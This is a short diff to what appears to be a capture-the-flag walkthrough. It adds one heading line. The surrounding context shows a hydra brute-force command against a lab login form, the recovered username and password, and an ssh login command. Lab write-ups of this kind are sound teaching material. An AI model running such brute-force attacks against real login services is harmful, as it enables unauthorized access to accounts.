@@ -43,6 +43,8 @@ hydra -P final -l elliot 10.10.115.29 http-post-form "/api/user/login:{"username
 ```
 {username : "elliot", password : "darkgray37"}
 ```
+### On the elliot I found the ssh password for elliot
+
 ```bash
 echo "Im_M1st3r_R0b0T" | ssh elliot@<IP> 
 ```
